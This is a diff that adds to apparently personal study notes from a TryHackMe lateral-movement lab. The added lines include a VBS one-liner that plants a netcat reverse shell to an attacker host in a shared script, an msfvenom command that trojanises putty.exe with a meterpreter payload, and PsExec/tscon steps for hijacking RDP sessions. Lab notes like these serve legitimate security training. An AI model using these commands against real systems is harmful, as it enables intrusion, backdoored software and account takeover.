@@ -250,6 +250,39 @@ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
 
 user@AttackBox$ nc -lvp 5555
 
-        
+pivoting and privileges injection
+
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+
+
+ABUSING USER BEHAVIOUR:
+
+Backdooring .vbs Scripts:
+As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:
+
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+
+This will copy nc64.exe from the share to the user's workstation %tmp% directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.
+
+Backdooring .exe Files:
+If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+RDP hijacking
+When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.
+PsExec64.exe -s cmd.exe
+
+query user //type this and we can go through active rdp sessions
+
+C:\> query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+ luke                                    3  Disc            .  4/6/2022 6:51 AM
+
+
+According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be rdp-tcp#6. We can also see that a user named luke has left a session open with id 3. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.
+To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:
+
+tscon 3 /dest:rdp-tcp#6
 
 
